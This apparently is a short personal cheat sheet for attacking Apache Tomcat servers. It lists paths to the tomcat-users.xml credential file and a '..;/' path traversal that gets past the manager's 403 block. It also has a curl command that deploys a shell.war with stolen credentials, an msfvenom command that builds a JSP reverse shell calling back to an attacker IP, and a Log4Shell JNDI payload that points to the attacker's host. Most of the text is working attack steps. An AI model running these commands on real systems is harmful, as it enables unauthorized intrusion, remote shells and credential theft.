Logs can be found

/var/lib/tomcat<version>/conf/tomcat-users.xml
/etc/usr/share/tomcat<version>/tomcat-users.xml
/usr/share/tomcat<version>/etc/tomcat-users.xml

(search  the internet for other locations)


I need to get an access to the “/manager/html” but if tomcat returned “403 -Forbidden” without even asking me for credentials I need to use the following path traversal to be asked for those creds 

                                       
http://<victim_ip>:8080/manager/simon/..;/html

And I should be prompted for credentials
If you got an access via the above method, you need to capture the request while deploying your shell.war file and modify the url

If after typing valid credentials tomcat returned the following message


“By default the manager is only accessible  from a browser running on the same machine as tomcat” then

Zip shell.war shell.jsp

Curl –T shell.war -u ‘<creds>’ http://<victim_ip>:8080/manager/text/deploy?path=/app
#and the in the browser

http://<victim_ip>:8080/app/shell.jsp

(see Appendix for the shell.jsp code)


 
Once I got an access to the /manager/html I will be:

A) uploading shell.war
(to generate shell.war)

Msfvenom –p java/jsp_shell_reverse_tcp lhost=<attacker_ip> lport=<attacker_port> -f war > shell.war

B)checking for Log4J
in the GUI, in the row with “Path /” -> field “with idle >” paste the following payload 
${jndi:ldap://<my_ip>:<port>/simon}
# if vulnerable I should get a connection

